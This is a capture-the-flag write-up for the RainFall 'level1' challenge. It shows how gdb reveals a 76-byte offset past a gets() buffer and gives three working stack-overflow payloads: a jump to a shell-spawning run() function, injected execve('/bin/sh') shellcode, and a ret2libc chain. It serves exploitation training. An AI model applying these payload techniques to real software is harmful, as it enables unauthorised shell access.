# level1

The binary presents doesn't take any arguments. It reads from `stdin` and do nothing if the input is less than 76 characters. And segfaults if the input is more  or equal than 76 characters.


## Step 1
Decompile the binary with `Ghidra` gives the following code: [source.c](https://github.com/lorispuchol/rainfall/blob/main/level1/source.c) 

`run` pops a shell but it is never called

`gets` is used to read the input. `gets` is vulnerable to buffer overflow.

```console
NAME
       gets - get a string from standard input (DEPRECATED)

SYNOPSIS
       #include <stdio.h>

       char *gets(char *s);

DESCRIPTION
       Never use this function.

       gets()  reads  a  line  from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte ('\0').  No check for buffer overrun is performed (see BUGS below).
```

## Goal  



Overflow the buffer to overwrite the __return address__ of the function `main` with the address of the function `run`. It will make the `next instruction pointer (eip)` to point to `run`.

```bash 
(gdb) info functions
```

```console
0x08048444  run
0x08048480  main
```

`run` is at `0x08048444` __which is `0x44\x84\x04\x08` in little endian__. [see here](https://www.geeksforgeeks.org/little-and-big-endian-mystery/)




```console
level1@RainFall:~$ gdb level1 
(gdb) b *main+16
Breakpoint 1 at 0x8048490
(gdb) r
Starting program: /home/user/level1/level1

Breakpoint 1, 0x08048490 in main ()
(gdb) disas
Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
=> 0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret    
End of assembler dump.
(gdb) info frame
Stack level 0, frame at 0xbffff740:
 eip = 0x8048490 in main; saved eip 0xb7e454d3
 Arglist at 0xbffff738, args: 
 Locals at 0xbffff738, Previous frame's sp is 0xbffff740
 Saved registers:
  ebp at 0xbffff738, eip at 0xbffff73c
(gdb) x $eax
0xbffff6f0:	0x08048400
(gdb) p  0xbffff73c - 0xbffff6f0
$1 = 76
```

`eax` of `gets` will write at `0xbffff6f0`. The `eip` is at `0xbffff73c`. So we want to overwrite `eip` and write address of `run` in, by overflowing `eax`.

> 76 bytes between `eax` and `eip`

> Illegal instruction if the input is equal to 76 characters because EOL is not an instruction.

## Exploit with `run`

```bash
(python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat)  | ./level1
```


Or

```bash
(python -c 'print "A" * 76 + "\x44\x84\x04\x08"') > /tmp/payload
cat /tmp/payload - | ./level1
```

> `cat` and `-` are used to keep the stdin open


## Exploit with shellcode

Write a shellcode at the start of the buffer. and overwrite the return address with the address of the buffer.

The shellcode are instructions that will pop a shell: [found here](https://cocomelonc.github.io/tutorial/2021/10/09/linux-shellcoding-1.html)

shellcode size = 23 bytes

```bash
(python -c 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80" + "A" * (76-23) + "\xf0\xf6\xff\xbf"'; cat) | /home/user/level1/level1
```
> `\xf0\xf6\xff\xbf` is the address of the buffer.


## Exploit with ret2libc

Return to libc use the dependencies linked to the binary. and and use it  to pop a shell. [see here](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc)

```bash
(python -c 'print "a" * 76 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"'; cat ) | /home/user/level1/level1
```


First: address of system: `(gdb) p system`  
Second: address of exit: `(gdb) p exit`  
Third: address of "/bin/sh": `find &system,+9999999,"/bin/sh"`

https://stackoverflow.com/questions/19124095/return-to-lib-c-buffer-overflow-exercise-issue

> - Adresses are found in the main frame  
> - Dont forget to run the binary with the same environment as in gdb (give the entirer path to the binary and/or unset LINES COLUNMS)

https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it